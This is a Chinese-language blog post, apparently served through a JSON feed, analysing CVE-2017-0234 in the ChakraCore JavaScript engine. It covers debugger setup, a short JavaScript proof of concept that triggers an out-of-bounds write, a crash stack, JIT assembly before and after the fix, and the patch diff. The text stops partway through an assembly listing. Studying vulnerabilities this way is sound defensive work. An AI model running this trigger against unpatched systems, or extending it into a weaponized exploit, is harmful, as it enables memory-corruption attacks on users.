{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2021-05-28 00:13:11","updatedTime":"2021-05-28 00:13:11","title":"case study:cve-2017-0234","link":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","description":"<h3 id=\"vs调试环境配置\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#vs调试环境配置\" class=\"headerlink\" title=\"vs调试环境配置\"></a>vs调试环境配置</h3>\n<h4 id=\"编译\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h4>\n<p>首先下载<a href=\"https://github.com/Microsoft/ChakraCore\" target=\"_blank\" rel=\"noopener\">ChakraCore</a><br>然后<code>git clone https://github.com/Microsoft/ChakraCore.git</code><br>在ChakraCore项目中搜索CVE-2017-0234，找到patch的commit，然后得到有漏洞的版本的hash<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg\" alt=\"\"><br>然后checkout,<code>git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6</code><br>然后在VS2015中打开<code>Build\\Chakra.Core.sln</code>，并生成解决方案<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg\" alt=\"\" /></br></br></br></img></br></br></br></p>\n<h4 id=\"调试\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4>\n<p> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg\" alt=\"\"><br>右键设置为启动项目<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg\" alt=\"\"><br>在命令参数写好绝对路径并执行<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070506.jpg\" alt=\"\"><br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg\" alt=\"\" /></br></img></br></br></img></br></br></img></p>\n<h3 id=\"windbg调试环境配置\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#windbg调试环境配置\" class=\"headerlink\" title=\"windbg调试环境配置\"></a>windbg调试环境配置</h3>\n<p>在windows store下载windbg preview<br>设置符号服务器<br><code>SRV*c:\\edgesymbol*http://msdl.microsoft.com/download/symbols</code><br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070526.jpg\" alt=\"\"><br>直接调试chakra<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070550.jpg\" alt=\"\"><br>Windbg preview可以直接查看源码，在源码点击下断,很方便。</br></img></br></br></img></br></br></br></p>\n<h3 id=\"crash\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#crash\" class=\"headerlink\" title=\"crash\"></a>crash</h3>\n<p>PoC</p>\n<figure class=\"highlight javascript\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br /></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\">begin, end, step, num</span>) </span>{</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> buffer = <span class=\"keyword\">new</span> <span class=\"built_in\">ArrayBuffer</span>(<span class=\"number\">0x10000</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> view = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint32Array</span>(buffer);</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0</span>, <span class=\"number\">0x4000</span>, <span class=\"number\">1</span>, <span class=\"number\">0x1234</span>);</span><br><span class=\"line\">write(<span class=\"number\">0x3000000e</span>, <span class=\"number\">0x40000010</span>, <span class=\"number\">0x10000</span>, <span class=\"number\">1851880825</span>);</span><br /></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg\" alt=\"\"><br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg\" alt=\"\"><br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg\" alt=\"\" /></br></img></br></img></p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">&gt;k</span><br><span class=\"line\"> 索引     函数      </span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\"> 1      0000018d9694015c()</span><br><span class=\"line\">*2      ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody(void *(*)(Js::RecyclableObject *, Js::CallInfo) address=0x0000018d96940000)</span><br><span class=\"line\"> 3 ChakraCore.dll!Js::InterpreterStackFrame::DoLoopBodyStart(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, const bool doProfileLoopCheck=false, bool isFirstIteration=true)</span><br><span class=\"line\"> 4 ChakraCore.dll!Js::InterpreterStackFrame::ProfiledLoopBodyStart&lt;1,1&gt;(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, bool isFirstIteration=true)</span><br><span class=\"line\"> 5 ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledLoopStart&lt;0,1&gt;(const unsigned char * ip=0x0000018d96828b49)</span><br><span class=\"line\"> 6 ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class=\"line\"> 7 ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class=\"line\"> 8 ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x0000019598284540, Js::ArgumentReader args={...}, void * returnAddress=0x0000018d968e0fba, void * addressOfReturnAddress=0x0000002e3a7fe4b8, const bool isAsmJs=false)</span><br><span class=\"line\"> 9 ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fe4f0)</span><br><span class=\"line\"> 10 [外部代码] </span><br><span class=\"line\"> 11 ChakraCore.dll!amd64_CallFunction()</span><br><span class=\"line\"> 12 ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x0000019598284540, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args={...})</span><br><span class=\"line\"> 13 ChakraCore.dll!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=16, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class=\"line\"> 14 ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfileCallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=0, unsigned short profileId=3, unsigned int inlineCacheIndex=3, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class=\"line\"> 15 ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, unsigned int flags=0)</span><br><span class=\"line\"> 16 ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class=\"line\"> 17 ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class=\"line\"> 18 ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x00000195982844e0, Js::ArgumentReader args={...}, void * returnAddress=0x0000018d968e0fc2, void * addressOfReturnAddress=0x0000002e3a7fef48, const bool isAsmJs=false)</span><br><span class=\"line\"> 19 ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fef80)</span><br><span class=\"line\"> 20 [外部代码] </span><br><span class=\"line\"> 21 ChakraCore.dll!amd64_CallFunction()</span><br><span class=\"line\"> 22 ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x00000195982844e0, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args={...})</span><br><span class=\"line\"> 23 ChakraCore.dll!Js::JavascriptFunction::CallRootFunctionInternal(Js::Arguments args={...}, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class=\"line\"> 24 ChakraCore.dll!Js::JavascriptFunction::CallRootFunction(Js::Arguments args={...}, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class=\"line\"> 25 ChakraCore.dll!RunScriptCore::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper={...})</span><br><span class=\"line\"> 26 ChakraCore.dll!ContextAPIWrapper::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620)</span><br><span class=\"line\"> 27 ChakraCore.dll!ContextAPIWrapper_Core&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) &gt;(ContextAPIWrapper::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext){...})</span><br><span class=\"line\"> 28 ChakraCore.dll!ContextAPIWrapper&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) &gt;(RunScriptCore::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper){...})</span><br><span class=\"line\"> 29 ChakraCore.dll!RunScriptCore(void * scriptSource=0x00000195982bc000, const unsigned char * script=0x0000018d967278e0, unsigned __int64 cb=266, LoadScriptFlag loadScriptFlag=LoadScriptFlag_Utf8Source | LoadScriptFlag_ExternalArrayBuffer, unsigned __int64 sourceContext=0, const wchar_t * sourceUrl=0x0000018d9682c1c0, bool parseOnly=false, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, bool isSourceModule=false, void * * result=0x0000000000000000)</span><br><span class=\"line\"> 30 ChakraCore.dll!CompileRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000, bool parseOnly=false)</span><br><span class=\"line\"> 31 ChakraCore.dll!JsRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class=\"line\"> 32 ch.exe!ChakraRTInterface::JsRun(void * script=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class=\"line\"> 33 ch.exe!RunScript(const char * fileName=0x0000018d9673df50, const char * fileContents=0x0000018d967278e0, void * bufferValue=0x0000000000000000, char * fullPath=0x0000002e3a7ffa70)</span><br><span class=\"line\"> 34 ch.exe!ExecuteTest(const char * fileName=0x0000018d9673df50)</span><br><span class=\"line\"> 35 ch.exe!ExecuteTestWithMemoryCheck(char * fileName=0x0000018d9673df50)</span><br><span class=\"line\"> 36 ch.exe!StaticThreadProc(void * lpParam=0x0000002e3a17fba8)</span><br><span class=\"line\"> 37 ch.exe!invoke_thread_procedure(unsigned int(*)(void *) procedure=0x00007ff7d84647d0, void * const context=0x0000002e3a17fba8)</span><br><span class=\"line\"> 38 ch.exe!thread_start&lt;unsigned int (__cdecl*)(void * __ptr64)&gt;(void * const parameter=0x0000018d9673ea70)</span><br><span class=\"line\"> 39 [外部代码]</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<h3 id=\"分析\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3>\n<h4 id=\"JIT\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#JIT\" class=\"headerlink\" title=\"JIT\"></a>JIT</h4>\n<p><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg\" alt=\"\"><br>关于JIT生成不是重点，于是我调试了一下并没有详细写出调用，只是说一下。<br>在循环的解释执行次数超出loopInterpretCount的值的时候，就会进入JIT代码生成，然后在JIT代码生成后就转到JIT中执行，不再解释执行。</br></br></img></p>\n<p>在JIT优化之后，DoLoopBodyStart调用CallLoopBody，参数是循环体JIT代码的地址。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg\" alt=\"\" /></br></p>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fn-&gt;GetIsAsmJsFunction())</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"function\">AutoRestoreLoopNumbers <span class=\"title\">autoRestore</span><span class=\"params\">(<span class=\"keyword\">this</span>, loopNumber, doProfileLoopCheck)</span></span>;</span><br><span class=\"line\">                newOffset = <span class=\"keyword\">this</span>-&gt;CallAsmJsLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class=\"line\">            }</span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> AutoRestoreLoopNumbers autoRestore(<span class=\"keyword\">this</span>, loopNumber, doProfileLoopCheck);</span><br><span class=\"line\"> newOffset = <span class=\"keyword\">this</span>-&gt;CallLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class=\"line\"> }</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>漏洞触发在循环体中</p>\n<h4 id=\"分析patch前汇编\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#分析patch前汇编\" class=\"headerlink\" title=\"分析patch前汇编\"></a>分析patch前汇编</h4>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">0000018D96940138  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class=\"line\">0000018D9694013E  inc         ecx  </span><br><span class=\"line\">0000018D96940140 cmp r9d,r10d ----&gt;检查begin是否小于end</span><br><span class=\"line\">0000018D96940143 jge 0000018D96940181 </span><br><span class=\"line\">0000018D96940145 mov r11,r14 </span><br><span class=\"line\">0000018D96940148 mov r13,r11 </span><br><span class=\"line\">0000018D9694014B shr r13,30h </span><br><span class=\"line\">0000018D9694014F cmp r13,1 </span><br><span class=\"line\">0000018D96940153 jne 0000018D9694032F </span><br><span class=\"line\">0000018D96940159 mov r13d,r11d </span><br><span class=\"line\">0000018D9694015C mov dword ptr [rsi+r9*4],r13d ----&gt;对数组元素赋值</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p><code>mov dword ptr [rsi+r9*4],r13d</code>是对view数组元素赋值，rsi是buffer的首地址,r9是数组索引值i,r13d即1851880825(hex:0x6E617579)是要赋的值</p>\n<p> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg\" alt=\"\"><br>由汇编可以看出，缺少对索引值的边界检查（或者说优化后只剩下了检查begin是否小于end，但是没有检查索引上界end是否超出数组内存边界）<br>于是就访问到了不能访问的地址,crash。</br></br></img></p>\n<h3 id=\"patch分析\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#patch分析\" class=\"headerlink\" title=\"patch分析\"></a>patch分析</h3>\n<ul>\n <li>patch<br><a href=\"https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3\" target=\"_blank\" rel=\"noopener\">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a>\n   <figure class=\"highlight plain\">\n    <table>\n     <tr>\n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br /></br></pre></td>\n      <td class=\"code\"><pre><span class=\"line\">Too aggressive bound check removal</span><br><span class=\"line\">Don't eliminate bounds checks on virtual typed arrays if we can't guarantee that the accesses will be within 4Gb</span><br /></br></pre></td>\n     </tr>\n    </table>\n   </figure>\n   <figure class=\"highlight c++\">\n    <table>\n     <tr>\n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n      <td class=\"code\"><pre><span class=\"line\">-            eliminatedLowerBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">-            eliminatedUpperBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">-            canBailOutOnArrayAccessHelperCall = <span class=\"literal\">false</span>;</span><br><span class=\"line\">+            <span class=\"comment\">// Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</span></span><br><span class=\"line\">+            <span class=\"comment\">// check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds</span></span><br><span class=\"line\">+ <span class=\"comment\">// checks in jitted code.</span></span><br><span class=\"line\">+ <span class=\"keyword\">if</span> (!GetIsAsmJSFunc())</span><br><span class=\"line\">+ {</span><br><span class=\"line\">+ IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</span><br><span class=\"line\">+ <span class=\"keyword\">if</span> (idxOpnd)</span><br><span class=\"line\">+ {</span><br><span class=\"line\">+ StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(<span class=\"literal\">nullptr</span>) : idxOpnd-&gt;m_sym;</span><br><span class=\"line\">+ Value * idxValue = FindValue(idxSym);</span><br><span class=\"line\">+ IntConstantBounds idxConstantBounds;</span><br><span class=\"line\">+ <span class=\"keyword\">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class=\"line\">+ {</span><br><span class=\"line\">+ BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class=\"line\">+ int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class=\"line\">+ int32 lowerBound = idxConstantBounds.LowerBound();</span><br><span class=\"line\">+ <span class=\"keyword\">if</span> (lowerBound &gt;= <span class=\"number\">0</span> &amp;&amp; ((<span class=\"keyword\">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class=\"line\">+ {</span><br><span class=\"line\">+ eliminatedLowerBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+ eliminatedUpperBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+ canBailOutOnArrayAccessHelperCall = <span class=\"literal\">false</span>;</span><br><span class=\"line\">+ }</span><br><span class=\"line\">+ }</span><br><span class=\"line\">+ }</span><br><span class=\"line\">+ }</span><br><span class=\"line\">+ <span class=\"keyword\">else</span></span><br><span class=\"line\">+ {</span><br><span class=\"line\">+ eliminatedLowerBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+ eliminatedUpperBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+ canBailOutOnArrayAccessHelperCall = <span class=\"literal\">false</span>;</span><br><span class=\"line\">+ }</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n     </tr>\n    </table>\n   </figure></br></li>\n</ul>\n<p>要分析patch，可以先看一下patch后现在的JIT代码是什么样，跟进JIT。<br>在这下个断点，跟到JIT里<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg\" alt=\"\"><br>再在JIT里下断点<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071218.jpg\" alt=\"\"><br>继续执行到断点，并单步跟进<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg\" alt=\"\" /></br></br></img></br></br></img></br></br></p>\n<h4 id=\"分析patch后汇编\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#分析patch后汇编\" class=\"headerlink\" title=\"分析patch后汇编\"></a>分析patch后汇编</h4>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">000001E8AB960000  mov         rax,1DFAB6B0A78h  </span><br><span class=\"line\">000001E8AB96000A  mov         rax,qword ptr [rax]  </span><br><span class=\"line\">000001E8AB96000D  add         rax,1C20h  </span><br><span class=\"line\">000001E8AB960014  jo          000001E8AB960376  </span><br><span class=\"line\">000001E8AB96001A  cmp         rsp,rax  </span><br><span class=\"line\">000001E8AB96001D jle 000001E8AB960376 </span><br><span class=\"line\">000001E8AB960023 nop dword ptr [rax] </span><br><span class=\"line\">000001E8AB960027 nop dword ptr [rax] </span><br><span class=\"line\">000001E8AB96002B mov qword ptr [rsp+20h],r9 </span><br><span class=\"line\">000001E8AB960030 mov qword ptr [rsp+18h],r8 </span><br><span class=\"line\">000001E8AB960035 mov qword ptr [rsp+10h],rdx </span><br><span class=\"line\">000001E8AB96003A mov qword ptr [rsp+8],rcx </span><br><span class=\"line\">000001E8AB96003F push rbp </span><br><span class=\"line\">000001E8AB960041 mov rbp,rsp </span><br><span class=\"line\">000001E8AB960044 sub rsp,30h </span><br><span class=\"line\">000001E8AB960048 push r15 </span><br><span class=\"line\">000001E8AB96004A push r14 </span><br><span class=\"line\">000001E8AB96004C push r13 </span><br><span class=\"line\">000001E8AB96004E push r12 </span><br><span class=\"line\">000001E8AB960050 push rdi </span><br><span class=\"line\">000001E8AB960052 push rsi </span><br><span class=\"line\">000001E8AB960054 push rbx </span><br><span class=\"line\">000001E8AB960056 sub rsp,28h </span><br><span class=\"line\">000001E8AB96005A mov rbx,1DFAB6701C0h </span><br><span class=\"line\">000001E8AB960064 mov rsi,7FFA484B2198h </span><br><span class=\"line\">000001E8AB96006E mov rdi,1E7AB7C47C4h </span><br><span class=\"line\">000001E8AB960078 mov r12,qword ptr [rbp+20h] </span><br><span class=\"line\">000001E8AB96007C mov r13,qword ptr [r12+160h] </span><br><span class=\"line\">000001E8AB960084 mov r14,qword ptr [r12+168h] </span><br><span class=\"line\">000001E8AB96008C mov r15,qword ptr [r12+158h] </span><br><span 